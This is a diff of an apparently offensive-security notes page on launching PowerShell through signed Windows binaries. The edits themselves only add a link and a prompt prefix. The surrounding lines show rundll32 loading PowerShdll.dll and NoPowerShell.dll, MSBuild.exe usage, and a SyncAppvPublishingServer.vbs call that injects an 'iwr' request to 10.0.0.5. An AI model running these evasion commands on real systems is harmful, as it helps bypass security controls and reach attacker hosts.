@@ -23,7 +23,7 @@ C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users
 {% endtab %}
 
 {% tab title="PowerShdll" %}
-We can load powerShdll with rundll32.exe to gain a shell
+We can load [PowerShdll](https://github.com/p3nt4/PowerShdll) with rundll32.exe to gain a shell
 
 ```bash
 C:\Users\v4resk> rundll32.exe PowerShdll.dll,main
@@ -44,7 +44,7 @@ C:\Users\v4resk> SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 This .NET Framework 2 compatible binary can be loaded in Cobalt Strike to execute commands in-memory. No `System.Management.Automation.dll` is used; only native .NET libraries. An alternative usecase for NoPowerShell is to launch it as a DLL via rundll32.exe:&#x20;
 
 ```powershell
-rundll32 NoPowerShell.dll,main
+C:\Users\v4resk> rundll32 NoPowerShell.dll,main
 ```
 {% endtab %}
 {% endtabs %}
